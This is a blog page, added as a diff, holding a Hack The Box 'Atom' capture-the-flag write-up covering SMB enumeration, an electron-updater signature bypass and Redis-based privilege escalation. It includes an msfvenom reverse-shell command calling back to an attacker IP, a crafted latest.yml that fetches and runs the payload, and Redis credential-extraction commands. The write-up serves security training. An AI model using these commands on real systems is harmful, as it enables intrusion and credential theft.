@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<head>
+
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-5YK5MXEZF1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-5YK5MXEZF1');
+</script>
+
+
+    <title>Write-ups</title>
+    
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       
+    <link rel="shortcut icon" href="favicon.ico"> 
+    
+    <!-- FontAwesome JS-->
+    <script defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+    
+    <!-- Theme CSS -->  
+    <link id="theme-style" rel="stylesheet" href="assets/css/theme-1.css">
+    
+
+</head> 
+
+<body>
+    
+    <header class="header text-center">	    
+	    <h1 class="blog-name pt-lg-1 mb-0"><a href="index.html">Adventures with Bits  </a></h1>
+        
+	    <nav class="navbar navbar-expand-lg navbar-dark" >
+           
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+			<span class="navbar-toggler-icon"></span>
+			</button>
+
+			<div id="navigation" class="collapse navbar-collapse flex-column" >
+				<div class="profile-section pt-3 pt-lg-0">
+				    <img class="profile-image mb-3 rounded mx-auto" src="assets/images/profile.png" alt="image" >			
+					
+					<div class="bio mb-3">"Technical Problems Can Have Artistic Solutions"<br>
+                                 - Jon Erickson The Art of Exploitation </div><!--//bio-->
+					<ul class="social-list list-inline py-3 mx-auto">
+
+			            <li class="list-inline-item"><a href="https://twitter.com/UnknownHimash"><i class="fab fa-twitter fa-fw"></i></a></li>
+			           
+			            <li class="list-inline-item"><a href="https://github.com/himash"><i class="fab fa-github-alt fa-fw"></i></a></li>
+			            
+			        </ul><!--//social-list-->
+			        
+				</div><!--//profile-section-->
+				
+				<ul class="navbar-nav flex-column text-left">
+					<li class="nav-item">
+					    <a class="nav-link" href="index.html"><i class="fas fa-home fa-fw mr-2"></i>Blog Home <span class="sr-only">(current)</span></a>
+					</li>
+					<li class="nav-item">
+					    <a class="nav-link" href="publications.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Publications</a>
+					</li>
+
+						<li class="nav-item">
+					    <a class="nav-link" href="projects.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Projects</a>
+					</li>
+					<li class="nav-item active">
+					    <a class="nav-link" href="write-up.html"><i class="fas fa-user fa-fw mr-2"></i>Write-ups</a>
+					</li>
+
+					<li class="nav-item">
+					    <a class="nav-link" href="tools.html"><i class="fas fa-user fa-fw mr-2"></i>Tools</a>
+					</li>
+
+					<li class="nav-item active">
+					    <a class="nav-link" href="ack.html"><i class="fas fa-user fa-fw mr-2"></i>Acknowledgements</a>
+					</li>
+
+				</ul>
+				
+				
+			</div>
+		</nav>
+    </header>
+
+
+    <!-----------------------------------Header and stuff Ends Here-------------------------------------------------->
+
+
+
+
+<!-------------------------------------Article Starts Here --------------------------------------------------------------->
+
+
+    <div class="main-wrapper">
+	    
+	    <article class="blog-post px-3 py-5 p-md-5">
+		    <div class="container">
+			    <header class="blog-post-header">
+				    <h2 class="title mb-2">Atom - HTB</h2>
+				    
+
+			    </header>
+			    
+			    <div class="blog-post-body">
+
+			    	<!-----PICTURE
+				    <figure class="blog-banner">
+				        <a href="https://made4dev.com"><img class="img-fluid" src="assets/images/blog/blog-post-banner.jpg" alt="image"></a>
+
+				        
+				        <figcaption class="mt-2 text-center image-caption">Image Credit: <a href="https://made4dev.com?ref=devblog" target="_blank">made4dev.com (Premium Programming T-shirts)</a></figcaption>
+				    </figure>
+				    -------------------------------------------------------->
+
+				    <p>
+
+				    	<br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-intro.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      Atom is windows machine with unique way of foothold and some interesting vulnerabilities.
+				      <br> Let's start with initial scan and see what could be the initial vector to get foothold in the machine.
+
+				      <br><br>
+
+				       <h4 class="title mb-2">Initial Foothold & User</h4>
+
+				       <br>
+
+				     
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-nmap1.png" alt="image"></a>
+
+				      </figure>
+
+				      <br> 
+
+				      	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-nmap2.png" alt="image"></a>
+
+				      </figure>
+
+				      <br> 
+
+				      Based on the simple nmap scan ports <b>80</b>(HTTP), <b>135</b>(MSRPC), <b>443</b>(HTTPS) and <b>445</b>(Microsoft-DS SMB file sharing) are opened.
+				      at the initial stage i would go for in-depth scan if i not get any lead from the simple scan, usually for the CTFs start with the simple scan and go for the more in-depth scan only if there is no any clear lead to go further, this will save our time and energy however for the penetration testing, a tester will scan the target with deep scan to prepare report to highlight all the vulnerabilities and security misconfigurations. based on the nmap scan result first let's check out the web content of the machine.  
+
+
+				      <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-web.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-web2.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      The web site is providing 'simple note taking application' to download. at this stage there are two options to do. <br>
+				      <br>
+
+				      1.Download the application and do reverse engineering and network interception to see if there is any lead to the next step.
+              <br><br>
+              2.Move to next options (Check web application and it's technologies, check out other opened ports) <br><br>
+              Writing your next assumption will give you a crystal clear idea to move further on the machine. you can try this and i hope you can see the positive result. basic reversing does not give any lead and application is not initiating any network connection. without going further on reversing the application, i went to check other ports in the machine.
+              SMB is enabled with anonymous login and i found interesting file "UAT_Testing_Procedures.pdf" inside the Software_Updates directory.  
+
+
+				      <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-smb1.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-smb2.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-smb3.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-pdf1.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+
+				      Further inspecting the PDF following key points has been identified.<br>
+				      <br>
+
+				      1. Application built with electron-builder<br>
+				      2. There’s no server interaction when creating notes<br>
+				      3. To initiate the QA process, just place the updates in one of the "client" folders, QA team will test it to ensure it finds an update and installs it.
+correctly.<br><br>
+
+				      Since few of the ports are opened in the machine, i would like to dig some deeper with this PDF, anonymous SMB and PDF file will be a hint to move further on the machine. upon analyzing the PDF file, it states that to initiate the QA process updates of the application should be placed in the 'client' folder.  <br><br>
+
+				      <a href='https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html'> https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a>
+				      <br><br>
+				      Signature Validation Bypass in Electron-Updater will leads to remote code execution. upon analyzing the vulnerability, during a software update, the application will request a file named latest.yml from the update server, which contains the definition of the new release - including the binary filename and hashes. To retrieve the update binary’s publisher, the module executes the following code leveraging the native Get-AuthenticodeSignature cmdlet from Microsoft.PowerShell.Security.
+				      <pre>
+				      	<code>
+
+    execFile("powershell.exe", ["-NoProfile", "-NonInteractive", "-InputFormat", "None", "-Command", `Get-AuthenticodeSignature '${tempUpdateFile}' | ConvertTo-Json -Compress`], {
+      timeout: 20 * 1000
+    }, (error, stdout, stderr) => {
+      try {
+        if (error != null || stderr) {
+          handleError(logger, error, stderr)
+          resolve(null)
+          return
+        }
+
+        const data = parseOut(stdout)
+        if (data.Status === 0) {
+          const name = parseDn(data.SignerCertificate.Subject).get("CN")!
+          if (publisherNames.includes(name)) {
+            resolve(null)
+            return
+          }
+        }
+
+        const result = `publisherNames: ${publisherNames.join(" | ")}, raw info: ` + JSON.stringify(data, (name, value) => name === "RawData" ? undefined : value, 2)
+        logger.warn(`Sign verification failed, installer signed with incorrect certificate: ${result}`)
+        resolve(result)
+      }
+      catch (e) {
+        logger.warn(`Cannot execute Get-AuthenticodeSignature: ${error}. Ignoring signature validation due to unknown error.`)
+        resolve(null)
+        return
+      }
+    })
+
+  </code>
+  </pre>
+
+              Based on this code snippet you can see that it is possible to bypass entire signature verification by triggering a parse error in the script. this can be easily achieved by using a filename containing a single quote and then by recalculating the file hash to match the attacker-provided binary. when serving a similar latest.yml to a vulnerable Electron app, the attacker-chosen setup executable will be run without warnings.
+              <pre>
+              <code>
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.73 LPORT=9000 -f exe -o"r'me.exe"
+
+              </code>
+              </pre>
+
+              So i just created the latest.yml file and hosted reverse shell executable in my server.
+              using <b>shasum -a 512 "r'me.exe" | cut -d " " -f1 | xxd -r -p | base64</b> i can calculate the sha512 of the executable.
+
+              <pre>
+              	<code>
+version : 1.2.3
+path : http://10.10.14.73:9090/r'me.exe
+sha512 : LsHJOMy8tBKqzEiKNd8zgoozBdr1tBQRjoHwfEE62LAGdI+9VXI6w49RPCEKRNx1cEn8QvvLfE73EfAvpvbzGw==
+
+</code>
+</pre>
+
+              Next step i just uploaded the above latest.yml file to the client folder then my reverse shell executable downloaded and executed therefore i got the reverse connection to my netcat listener.
+
+
+                  <br><br>
+
+				    	<figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-smb-put.png" alt="image"></a>
+
+				      </figure>
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-file-serv.png" alt="image"></a>
+
+				      </figure>
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-rev.png" alt="image"></a>
+
+				      </figure>
+
+				      After successful reverse connection i found the user.txt under json user desktop.
+
+				      <br><br>
+
+				      <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-user.png" alt="image"></a>
+
+				      </figure>
+
+				       <h4 class="title mb-2">Privilege Escalation</h4>
+
+				       Basically for the privilege escalation part i would recommend to check all system folders, files and active network connections manually before being run any privilege escalation scripts. upon checking i have found below interesting items from the machine.
+		           <br><br>
+		           1. Portablekanban installed in the machine - Vulnerable software <a href='https://www.exploit-db.com/exploits/49409'> https://www.exploit-db.com/exploits/49409 </a>
+
+		           <br>
+		           <br>
+
+		           <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-pk.png" alt="image"></a>
+
+				      </figure>
+
+				       2. Redis configuration file - with password 
+
+				       <br>
+		           <br>
+
+		           <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-redis.png" alt="image"></a>
+
+				      </figure>
+
+				       3. Network connections [Notably WinRM-5985 & Redis-6379]
+
+
+				       <br>
+		           <br>
+
+		           <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-conn.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+
+				      A successful privilege escalation can be done from proper & in-depth enumeration and connecting the dots.
+				      by using the redis password i can log in to the server.
+
+				    
+
+
+
+				      <br>
+
+				      Redis is an open source, advanced key-value store and an apt solution for building highperformance, scalable web applications.
+				      by using below commands i can extract portablekanban encrypted password from the database.
+
+				      <pre>
+				      	<code>
+
+INFO --- Get all statistics and information about the server
+SELECT 0 --- In order to dump database 0 you need to supply this command
+KEY * --- To get a list of all the keys available in Redis
+GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 --- Redis GET command is used to get the value stored in the specified key
+
+              </code>
+              </pre>
+
+              From redis server i found encrypted password of the administrator, by using portablekanban exploit it is possible to decrypt the password. [<a href='https://www.exploit-db.com/exploits/49409'> https://www.exploit-db.com/exploits/49409 </a>]
+
+
+                <br>
+		           <br>
+
+		           <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-de-pass.png" alt="image"></a>
+
+				      </figure>
+
+				      So i have administrator password, i used WinRM running on port 5985 to log in with password by using Evil-WinRM.
+
+				      <br>
+		           <br>
+
+		           <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-admin1.png" alt="image"></a>
+
+				      </figure>
+
+				      <br>
+		           
+
+		           <figure class="blog-banner">
+
+				        <a><img class="img-fluid" src="assets/images/writeup/atom/at-admin2.png" alt="image"></a>
+
+				      </figure>
+
+				      The privilege escalation part is very interesting and realistic, here we can learn how to connect multiple points to escalate privileges. 
+
+
+
+	
+
+<!--------------------------------------------Article End ------------------------------------------------------>
+
+
+
+				    <!--------------------------------------------------------------------------------------------- Coding section
+				    <h3 class="mt-5 mb-3">Code Block Example</h3>
+				    <p>You can get more info at <a href="https://highlightjs.org/" target="_blank">https://highlightjs.org/</a>. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. </p>
+				    <pre>
+					    <code>
+function $initHighlight(block, cls) {
+  try {
+    if (cls.search(/\bno\-highlight\b/) != -1)
+      return process(block, true, 0x0F) +
+             ` class="${cls}"`;
+  } catch (e) {
+    /* handle exception */
+  }
+  for (var i = 0 / 2; i < classes.length; i++) {
+    if (checkCondition(classes[i]) === undefined)
+      console.log('undefined');
+  }
+}
+
+export  $initHighlight;
+					    </code>
+				    </pre>
+
+				  Ending here --------------------------------------------------------------------------------------------> 
+
+					
+
+					
+				   
+			    </div>
+				    
+
+				  <!--------------------------------------------------------------------------------- Navigation section  
+			    <nav class="blog-nav nav nav-justified my-5">
+				  <a class="nav-link-prev nav-item nav-link rounded-left" href="index.html">Previous<i class="arrow-prev fas fa-long-arrow-alt-left"></i></a>
+				  <a class="nav-link-next nav-item nav-link rounded-right" href="blog-list.html">Next<i class="arrow-next fas fa-long-arrow-alt-right"></i></a>
+				</nav>
+				-----------------------------------------------------------------------------------------------------------> 
+
+	    </article>
+	    
+
+    
+    </div><!--//main-wrapper-->
+    
+
+
+
+    
+       
+    <!-- Javascript -->          
+    <script src="assets/plugins/jquery-3.3.1.min.js"></script>
+    <script src="assets/plugins/popper.min.js"></script> 
+    <script src="assets/plugins/bootstrap/js/bootstrap.min.js"></script> 
+    
+    <!-- Page Specific JS -->
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.14.2/highlight.min.js"></script>
+
+    <!-- Custom JS -->
+    <script src="assets/js/blog.js"></script>
+      
+    
+
+</body>
+</html> 
